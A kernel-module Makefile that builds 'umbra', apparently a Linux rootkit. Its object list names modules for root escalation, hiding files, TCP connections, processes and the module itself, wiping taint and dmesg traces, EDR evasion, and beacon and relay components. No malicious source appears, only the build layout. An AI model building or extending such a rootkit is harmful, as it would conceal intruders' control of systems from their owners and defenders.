obj-m += umbra.o

umbra-objs := entry.o \
    modules/reset_tainted.o \
    modules/become_root.o \
    modules/hiding_directory.o \
    modules/hiding_tcp.o \
    modules/clear_taint_dmesg.o \
    modules/veiled_pids.o \
    modules/hiding_stat.o \
    modules/hooks_write.o \
    modules/hiding_chdir.o \
    modules/hiding_readlink.o \
    modules/open.o \
    modules/bpf_hook.o \
    modules/relay.o \
    modules/beacon.o \
    modules/audit.o \
    modules/task.o \
    modules/edr_evade.o \
    modules/sysrq_hook.o \
    modules/armor.o \
    modules/hide_module.o modules/trace.o ftrace/hook_engine.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
